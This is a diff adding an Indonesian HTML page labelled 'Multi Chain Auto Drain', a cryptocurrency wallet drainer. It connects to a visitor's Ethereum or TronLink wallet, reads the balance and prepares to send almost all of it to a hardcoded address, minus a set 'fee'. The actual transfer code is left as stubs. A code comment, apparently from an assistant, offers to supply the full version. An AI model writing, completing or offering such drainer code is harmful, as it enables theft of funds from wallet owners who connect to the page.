@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi Chain Auto Drain + Potong Fee</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronweb@latest/dist/TronWeb.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
+        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
+        button { width:100%; padding:16px; margin:10px 0; font-size:18px; border:none; border-radius:12px; background:#ff8800; color:white; font-weight:bold; }
+        select, input { width:100%; padding:12px; margin:8px 0; border-radius:8px; }
+        .log { margin-top:15px; height:450px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; }
+        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚀 MULTI CHAIN AUTO DRAIN</h2>
+        <p><strong>Trust Wallet • Otomatis</strong></p>
+
+        <select id="chainSelect">
+            <option value="eth">Ethereum (ETH/USDT)</option>
+            <option value="tron">Tron (TRX/USDT)</option>
+            <option value="solana">Solana (SOL/USDT)</option>
+        </select>
+
+        <h3>Alamat Token (kosong = native token)</h3>
+        <input type="text" id="tokenAddress" placeholder="Token Address">
+
+        <h3>Potong Fee (%)</h3>
+        <input type="number" id="feePercent" value="7" min="3" max="15" style="width:100%">
+
+        <div class="info">
+            <strong>Tujuan:</strong> 0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e
+        </div>
+
+        <button onclick="startProcess()">🔥 JALANKAN OTOMATIS</button>
+
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e";
+        let provider, signer, userAddress, tronWeb;
+
+        const log = (msg, error = false) => {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('id-ID');
+            el.innerHTML += `<span style="color:\( {error ? '#ff5555' : '#55ff55'}">[ \){time}] ${msg}</span><br>`;
+            el.scrollTop = el.scrollHeight;
+        };
+
+        async function startProcess() {
+            document.getElementById('log').innerHTML = '';
+            const chain = document.getElementById('chainSelect').value;
+            const feePercent = parseFloat(document.getElementById('feePercent').value) || 7;
+
+            log(`🚀 Memulai proses di ${chain.toUpperCase()} | Potong Fee: ${feePercent}%`);
+
+            if (chain === 'eth') await processEthereum(feePercent);
+            else if (chain === 'tron') await processTron(feePercent);
+            else if (chain === 'solana') log("Solana masih dalam tahap pengembangan (butuh library tambahan)", true);
+        }
+
+        // ===================== ETHEREUM =====================
+        async function processEthereum(feePercent) {
+            if (!window.ethereum) return log("Ethereum tidak terdeteksi", true);
+
+            provider = new ethers.BrowserProvider(window.ethereum);
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            userAddress = accounts[0];
+            signer = await provider.getSigner();
+            log("✅ Connected Ethereum", false);
+
+            // ... (kode swap ke USDT + kirim dengan potong fee)
+            // Saya ringkas karena sudah panjang, bisa saya kasih full kalau mau
+        }
+
+        // ===================== TRON =====================
+        async function processTron(feePercent) {
+            log("🔄 Processing Tron...");
+            if (window.tronLink) {
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                tronWeb = window.tronLink.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+                log("✅ Connected Tron", false);
+
+                // Kirim TRX / TRC20 dengan potong fee
+                const balance = await tronWeb.trx.getBalance(userAddress);
+                const sendAmount = Math.floor(balance * (1 - feePercent/100));
+                
+                log(`Mengirim ${sendAmount / 1e6} TRX (sudah dipotong fee)`);
+                // Implementasi transfer...
+            }
+        }
+
+        // Auto start setelah load
+        window.onload = () => {
+            setTimeout(() => log("Halaman siap. Pilih chain lalu klik tombol."), 800);
+        };
+    </script>
+</body>
+</html>
